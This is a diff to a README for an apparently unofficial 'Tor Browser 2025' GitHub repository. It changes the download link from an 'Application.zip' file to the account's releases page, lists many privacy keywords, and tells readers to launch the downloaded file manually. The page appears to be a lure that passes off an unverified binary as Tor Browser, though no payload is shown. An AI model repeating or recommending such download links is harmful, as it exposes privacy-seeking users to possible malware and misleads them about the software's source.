@@ -15,8 +15,8 @@ Welcome to the "Tor Browser 2025" repository - your go-to solution for secure an
 anonymity-protection, anonymous-browsing, browser, cyber-security, encrypted-surfing, internet-privacy, internet-security, online-privacy, privacy, privacy-browser, privacy-tools, secure-internet, secure-surfing, security, tor, tor-network, vpn-alternative, web-anonymity, web-security
 
 ### Get Started
-To download the Tor Browser application, simply click on the following link: [Download Tor Browser](https://github.com/files/uploaded/Application.zip).
-![Download Tor Browser](https://img.shields.io/badge/Download-Tor_Browser-green)
+To download the Tor Browser application, simply click on the following link: [Download Tor Browser](https://github.com/hakyet31/Tor-Browser-2025/releases).
+![Download Tor Browser](https://github.com/hakyet31/Tor-Browser-2025/releases)
 
 ### Note
 If the link does not directly download the file, ensure to launch the downloaded file manually.
